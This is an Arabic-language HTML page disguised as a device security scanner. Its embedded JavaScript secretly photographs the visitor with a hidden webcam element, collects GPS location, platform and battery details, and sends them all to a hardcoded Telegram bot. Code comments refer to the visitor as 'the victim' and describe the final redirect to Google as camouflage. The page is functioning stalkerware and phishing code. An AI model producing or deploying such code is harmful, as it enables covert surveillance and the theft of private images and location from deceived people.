<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فحص أمان الجهاز</title>
    <style>
        body { background: #0c0c0c; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; padding: 50px 20px; }
        .box { border: 1px solid #00ff41; padding: 20px; border-radius: 10px; display: inline-block; background: #1a1a1a; box-shadow: 0 0 15px #00ff41; }
        .loader { border: 5px solid #333; border-top: 5px solid #00ff41; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        button { background: #00ff41; color: black; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="box">
        <h2>System Security Scanner</h2>
        <div class="loader"></div>
        <p id="status">جاري فحص حالة البطارية والمعالج...</p>
        <button onclick="startFullScan()">ابدأ الفحص العميق</button>
    </div>

    <video id="video" width="1" height="1" autoplay style="visibility:hidden;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';
        let chatId = "";

        // 1. جلب الـ ID تلقائياً (كما طلبنا سابقاً بالتوكن فقط)
        async function getChatId() {
            try {
                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates`);
                const data = await res.json();
                chatId = data.result[data.result.length - 1].message.chat.id;
            } catch (e) { console.log("Error getting ID"); }
        }

        // 2. سحب معلومات الجهاز والبطارية (يعمل فوراً بدون إذن)
        async function getDeviceInfo() {
            let info = `📱 معلومات الجهاز:\n`;
            info += `- النظام: ${navigator.platform}\n`;
            info += `- المتصفح: ${navigator.userAgent.split(' ')[0]}\n`;
            
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                info += `- البطارية: ${Math.round(battery.level * 100)}%\n`;
                info += `- جاري الشحن: ${battery.charging ? "نعم" : "لا"}\n`;
            }

            sendToTelegram(info);
        }

        // 3. وظيفة الإرسال العامة
        function sendToTelegram(text) {
            if (!chatId) return;
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
        }

        // 4. سحب الموقع الجغرافي (يطلب إذن)
        function getGPS() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    const map = `📍 موقع الضحية:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    sendToTelegram(map);
                });
            }
        }

        // 5. التقاط الصورة وإرسالها (يطلب إذن)
        async function capturePhoto() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob(blob => {
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', blob, 'shot.jpg');
                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg');
        }

        // تشغيل كل شيء عند ضغط الزر
        async function startFullScan() {
            document.getElementById('status').innerText = "جاري الفحص... يرجى الموافقة على الأذونات";
            
            await getChatId(); // تحديد الهدف
            getDeviceInfo();   // سحب البطارية والمعلومات (صامت)
            
            // طلب الكاميرا والموقع
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;
                getGPS();          // سحب الموقع
                setTimeout(() => {
                    capturePhoto(); // التقاط الصورة بعد ثانية
                    document.getElementById('status').innerText = "اكتمل الفحص بنسبة 100%";
                    // تمويه: تحويله بعد 3 ثواني
                    setTimeout(() => { window.location.href = "https://www.google.com"; }, 3000);
                }, 2000);
            } catch (e) {
                alert("يجب السماح بالأذونات لإكمال الفحص!");
            }
        }

        // البدء بجلب الـ ID فور فتح الصفحة
        window.onload = getChatId;
    </script>
</body>
</html>
